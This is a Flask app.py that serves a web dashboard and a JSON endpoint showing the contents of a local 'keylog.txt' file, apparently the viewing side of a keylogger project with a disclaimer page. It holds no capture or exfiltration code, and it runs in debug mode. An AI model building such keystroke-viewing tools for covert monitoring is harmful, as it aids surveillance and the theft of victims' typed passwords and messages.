# app.py
from flask import Flask, render_template, jsonify
import os

app = Flask(__name__)

# Get the absolute path of the directory this file is in
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "keylog.txt")

@app.route('/')
def dashboard():
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                # Replace newlines with <br> for HTML formatting
                logs = f.read().replace("\n", "<br>")
        else:
            logs = "No logs available."
    except Exception as e:
        logs = f"Error reading logs: {str(e)}"
    return render_template("dashboard.html", logs=logs)

@app.route('/disclaimer')
def disclaimer():
    return render_template("disclaimer.html")

@app.route('/logs', methods=['GET'])
def get_logs():
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r', encoding="utf-8") as file:
                logs = file.read()
            return jsonify({'logs': logs})
        else:
            return jsonify({'logs': "No logs available."})
    except Exception as e:
        return jsonify({'logs': f"Error reading logs: {str(e)}"})

if __name__ == '__main__':
    app.run(debug=True, port=5000)
